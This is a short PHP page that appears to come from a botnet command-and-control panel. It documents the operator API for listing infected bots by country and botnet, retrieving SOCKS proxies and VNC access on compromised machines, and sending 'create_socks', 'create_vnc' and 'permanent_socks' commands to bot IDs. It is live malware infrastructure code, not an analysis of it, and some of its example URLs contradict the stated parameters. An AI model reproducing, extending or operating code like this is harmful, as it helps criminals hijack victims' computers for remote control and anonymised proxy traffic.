<?php

if (!defined('__CP__')) {
	exit();
}

ThemeBegin('Api service', 0, 0, 0);
$fullurl = $_SERVER['HTTP_HOST'] . $config['api_url'];
echo 'Api url: <code>';
echo $fullurl;
echo '</code><br><br>' . "\r\n\r\n" . '<b>Get bots</b><br>' . "\r\n" . 'Method: GET, POST<br>' . "\r\n" . 'Parametrs: <code>?action=get&country=&botnet=&bots=</code><br>' . "\r\n" . 'Example: <code>';
echo $fullurl;
echo '?action=get&country=IT&botnet=newtest&bots=</code><br><br>' . "\r\n\r\n" . '<b>Get socks</b><br>' . "\r\n" . 'Method: GET, POST<br>' . "\r\n" . 'Parametrs: <code>?action=socks&country=&botnet=&bots=</code><br>' . "\r\n" . 'Example: <code>';
echo $fullurl;
echo '?action=get&country=IT&botnet=newtest&bots=</code><br><br>' . "\r\n\r\n" . '<b>Get VNC</b><br>' . "\r\n" . 'Method: GET, POST<br>' . "\r\n" . 'Parametrs: <code>?action=vnc&country=&botnet=&bots=</code><br>' . "\r\n" . 'Example: <code>';
echo $fullurl;
echo '?action=get&country=IT&botnet=newtest&bots=</code><br><br>' . "\r\n\r\n" . '<b>Send command</b><br>' . "\r\n" . 'Method: POST<br>' . "\r\n" . 'Commands: create_socks, create_vnc, permanent_socks<br>' . "\r\n" . 'Parametrs: <code>?action=command&command=&bots=</code><br>' . "\r\n" . 'Example: <code>';
echo $fullurl;
echo '?action=command&command=create_socks&bots=BOTID%20BOTID2</code>' . "\r\n\r\n";
ThemeEnd();

?>
